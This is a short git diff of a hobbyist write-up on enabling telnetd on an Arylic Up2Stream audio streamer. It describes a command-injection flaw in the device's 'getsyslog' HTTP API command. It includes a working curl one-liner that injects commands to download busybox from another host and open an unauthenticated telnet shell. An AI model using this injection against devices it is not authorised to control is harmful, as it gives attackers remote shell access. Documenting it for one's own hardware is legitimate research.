@@ -3,7 +3,7 @@ To enable telnetd on these devices, a security vulnerability had to be exploited
 
 The command that has this vulnerability is **_"getsyslog"_**, see https://developer.arylic.com/httpapi/#get-system-log and https://labs.withsecure.com/advisories/linkplay-firmware-wanlan-remote-code-execution. The command has an option to add an IP address from a slave device, e.g. **_"getsyslog:ip:10.1.1.90"_**, so a CLI command is executed on the device to retrieve the system log from the slave device that includes the IP address. Instead of just having an IP address as a parameter, that CLI command can also include a ";" and a second CLI command. You do not even have to provide an IP address, but can append the ";" and second command directly after the ":ip:". 
 
-The following code snippets are using the IP address 10.1.1.52 for my Arylic Up2Stream Pro v3 device and 10.1.1.22 for a web server running on my local MacBook. 
+The following code snippets are using the IP address 10.1.1.52 for my Arylic Up2Stream Pro v3 device and 10.1.1.22 for a web server running on my local MacMini. 
 ```
 curl "http://10.1.1.52httpapi.asp?command=getsyslog:ip:;wget+-O+/tmp/bin/busybox+-T+5+http://10.1.1.22/a31/busybox+-q;chmod+777+/tmp/bin/busybox;/tmp/bin/busybox+telnetd+-l/bin/ash";
 ```
